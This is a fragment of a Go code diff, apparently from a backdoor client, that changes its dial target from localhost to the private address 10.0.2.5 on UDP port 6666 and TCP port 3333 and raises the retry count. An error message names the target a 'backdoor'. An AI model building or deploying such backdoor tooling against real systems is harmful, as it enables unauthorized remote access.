@@ -83,7 +83,7 @@ func recvThread(conn net.Conn, gcm cipher.AEAD, info []byte, wg *sync.WaitGroup)
 
 func main() {
 	// Begin connection
-	udp, uerr := net.Dial("udp", "localhost:6666")
+	udp, uerr := net.Dial("udp", "10.0.2.5:6666")
 	if uerr != nil {
 		fmt.Println("Error dialing the backdoor, exiting...")
 		return
@@ -93,8 +93,8 @@ func main() {
 	var conn net.Conn
 	var err error
 	// Retry every 250ms depending on system
-	for i := 0; i < 6; i++ {
-		conn, err = net.Dial("tcp", "localhost:3333")
+	for i := 0; i < 16; i++ {
+		conn, err = net.Dial("tcp", "10.0.2.5:3333")
 		if err != nil {
 			time.Sleep(250 * time.Millisecond)
 		} else {
